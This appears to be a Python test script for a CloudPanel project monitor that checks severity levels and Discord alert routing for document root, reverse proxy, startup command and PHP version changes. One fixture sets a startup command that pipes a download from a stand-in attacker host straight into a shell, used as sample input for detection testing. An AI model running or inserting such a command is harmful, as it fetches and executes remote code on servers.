import asyncio
import os
import sys

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _REPO_ROOT)
os.chdir(_REPO_ROOT)

from config.manager import CloudPanelMonitorConfig, DiscordConfig, NotificationPolicyConfig, OutboundBackpressureConfig
from core.datatypes import EventCategory, Severity
from core.event_bus import EventBus
from discord_integration.webhook import _SEND_OK, DiscordWebhookDispatcher
from modules.cloudpanel_monitor import CloudPanelMonitor, CloudPanelProjectSnapshot


class _FakeBot:
    def is_ready(self) -> bool:
        return True


def make_monitor():
    mon = CloudPanelMonitor(EventBus(), CloudPanelMonitorConfig(enabled=True))
    published = []
    mon.publish = lambda ev: published.append(ev)
    return mon, published


def base_snapshot(**overrides):
    fields = dict(
        domain="example.com", linux_user="clientuser", project_path="/home/clientuser/htdocs/example.com",
        document_root="/home/clientuser/htdocs/example.com/public", website_type="PHP",
        php_version="8.3", node_version=None, python_version=None, runtime="php-fpm",
        port=None, reverse_proxy=None, startup_command=None,
    )
    fields.update(overrides)
    return CloudPanelProjectSnapshot(**fields)


async def main() -> None:
    mon, pub = make_monitor()
    old = base_snapshot()
    new = base_snapshot(document_root="/home/clientuser/htdocs/example.com/uploads")
    mon._publish_project_changes(old, new)
    events = [e for e in pub if e.category == EventCategory.CLOUDPANEL_DOCUMENT_ROOT_CHANGED]
    assert len(events) == 1
    assert events[0].severity == Severity.HIGH, (
        "an unexpected document root change is security-sensitive and must be HIGH severity, "
        f"got {events[0].severity}"
    )
    print("Scenario 1 (CLOUDPANEL_DOCUMENT_ROOT_CHANGED -- HIGH severity) PASSED")

    mon2, pub2 = make_monitor()
    old2 = base_snapshot(reverse_proxy=None)
    new2 = base_snapshot(reverse_proxy="http://127.0.0.1:19999")
    mon2._publish_project_changes(old2, new2)
    events2 = [e for e in pub2 if e.category == EventCategory.CLOUDPANEL_REVERSE_PROXY_CHANGED]
    assert len(events2) == 1
    assert events2[0].severity == Severity.HIGH, (
        f"an unexpected reverse proxy target change must be HIGH severity, got {events2[0].severity}"
    )
    print("Scenario 2 (CLOUDPANEL_REVERSE_PROXY_CHANGED -- HIGH severity) PASSED")

    mon3, pub3 = make_monitor()
    old3 = base_snapshot(startup_command="node server.js")
    new3 = base_snapshot(startup_command="bash -c 'curl evil.example.com | sh'")
    mon3._publish_project_changes(old3, new3)
    events3 = [e for e in pub3 if e.category == EventCategory.CLOUDPANEL_STARTUP_COMMAND_CHANGED]
    assert len(events3) == 1
    assert events3[0].severity == Severity.HIGH, (
        f"an unexpected startup command change must be HIGH severity, got {events3[0].severity}"
    )
    print("Scenario 3 (CLOUDPANEL_STARTUP_COMMAND_CHANGED -- HIGH severity) PASSED")

    mon4, pub4 = make_monitor()
    old4 = base_snapshot(php_version="8.2")
    new4 = base_snapshot(php_version="8.3")
    mon4._publish_project_changes(old4, new4)
    events4 = [e for e in pub4 if e.category == EventCategory.CLOUDPANEL_PHP_VERSION_CHANGED]
    assert len(events4) == 1
    assert events4[0].severity == Severity.MEDIUM, (
        "a routine PHP version bump stays MEDIUM at the detector level -- suppression to "
        f"internal-only happens at the notification_policy layer, not here, got {events4[0].severity}"
    )
    print("Scenario 4 (CLOUDPANEL_PHP_VERSION_CHANGED -- still MEDIUM at detector level) PASSED")

    routine_categories = [
        "CLOUDPANEL_PROJECT_UPDATED", "CLOUDPANEL_PHP_VERSION_CHANGED", "CLOUDPANEL_NODE_VERSION_CHANGED",
        "CLOUDPANEL_PYTHON_VERSION_CHANGED", "CLOUDPANEL_RUNTIME_CHANGED", "CLOUDPANEL_PORT_CHANGED",
    ]

    def make_dispatcher():
        config = DiscordConfig(
            category_channels={},
            alert_channel_id=999999999999999999,
            notification_policy=NotificationPolicyConfig(enabled=True, internal_only_categories=routine_categories),
            outbound=OutboundBackpressureConfig(dedup_window_seconds=0.0),
        )
        dispatcher = DiscordWebhookDispatcher(EventBus(), config)
        dispatcher._bot = _FakeBot()
        return dispatcher

    dispatcher = make_dispatcher()
    sent = []

    async def fake_send(payload, event_id=None, category=None, source_module=None, channel_id=None):
        sent.append((source_module, category))
        return _SEND_OK, channel_id, 1
    dispatcher._send_via_bot = fake_send

    for ev in events4:
        await dispatcher._on_event(ev)
    assert not sent, (
        "CLOUDPANEL_PHP_VERSION_CHANGED is a routine version bump listed in "
        f"notification_policy.internal_only_categories -- must produce zero Discord sends, got {sent}"
    )
    print("Scenario 5 (routine CLOUDPANEL_PHP_VERSION_CHANGED suppressed via notification_policy) PASSED")

    sent.clear()
    for ev in events:
        await dispatcher._on_event(ev)
    assert sent, (
        "CLOUDPANEL_DOCUMENT_ROOT_CHANGED is NOT listed in internal_only_categories and is HIGH "
        f"severity -- it must still reach Discord, got {sent}"
    )
    print("Scenario 6 (security-sensitive CLOUDPANEL_DOCUMENT_ROOT_CHANGED still delivered) PASSED")

    print("\nALL CLOUDPANEL NOTIFICATION TAXONOMY TESTS PASSED")


asyncio.run(asyncio.wait_for(main(), timeout=60))
